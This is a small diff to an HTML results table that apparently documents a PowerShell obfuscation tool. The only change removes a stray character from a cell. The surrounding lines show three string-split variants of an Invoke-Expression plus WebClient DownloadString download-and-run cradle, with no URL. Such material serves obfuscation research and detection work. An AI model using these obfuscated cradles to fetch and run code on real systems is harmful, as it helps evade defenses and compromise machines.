@@ -70,7 +70,7 @@ you can copy the results from all cases for one or more obfuscation methods and 
  <tr>
   <td align="center">2</td>
   <td align="center">TOKEN\COMMAND\2</td>
-  <td nowrap> 2
+  <td nowrap>
    <p>&('In'+'voke-Expressi'+'o'+'n') (.('New-Ob'+'jec'+'t') Net.WebClient).DownloadString</p>
    <p>.('Inv'+'oke-Ex'+'pr'+'ess'+'ion') (&('Ne'+'w'+'-O'+'bject') Net.WebClient).DownloadString</p>
    <p>.('Invok'+'e-'+'Ex'+'pressio'+'n') (.('Ne'+'w-Ob'+'ject') Net.WebClient).DownloadString</p>
